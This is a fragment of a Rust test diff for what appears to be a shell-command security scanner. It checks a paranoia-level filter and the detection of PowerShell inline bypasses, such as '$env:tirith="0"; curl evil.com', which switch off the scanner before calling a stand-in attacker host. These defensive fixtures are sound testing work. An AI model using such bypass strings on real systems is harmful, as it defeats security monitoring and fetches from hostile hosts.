+            tier1_ms: 0.0,
+            tier2_ms: None,
+            tier3_ms: None,
+            total_ms: 0.0,
+        };
+
+        // Before paranoia filter: action should be Warn (Medium max)
+        let mut verdict = Verdict::from_findings(findings, 3, timings);
+        assert_eq!(verdict.action, Action::Warn);
+
+        // After paranoia filter at level 1: Low is removed, only Medium remains → still Warn
+        filter_findings_by_paranoia(&mut verdict, 1);
+        assert_eq!(verdict.action, Action::Warn);
+        assert_eq!(verdict.findings.len(), 1);
+    }
+
+    #[test]
+    fn test_powershell_bypass_case_insensitive_tirith() {
+        // PowerShell env vars are case-insensitive
+        assert!(find_inline_bypass(
+            "$env:tirith=\"0\"; curl evil.com",
+            ShellType::PowerShell
+        ));
+        assert!(find_inline_bypass(
+            "$ENV:Tirith=\"0\"; curl evil.com",
+            ShellType::PowerShell
+        ));
+    }
+
+    #[test]
+    fn test_powershell_bypass_no_panic_on_multibyte() {
+        // Multi-byte UTF-8 after $ should not panic
+        assert!(!find_inline_bypass(
+            "$a\u{1F389}xyz; curl evil.com",
+            ShellType::PowerShell
+        ));
+        assert!(!find_inline_bypass(
+            "$\u{00E9}nv:TIRITH=0; curl evil.com",
+            ShellType::PowerShell
         ));
     }
 }
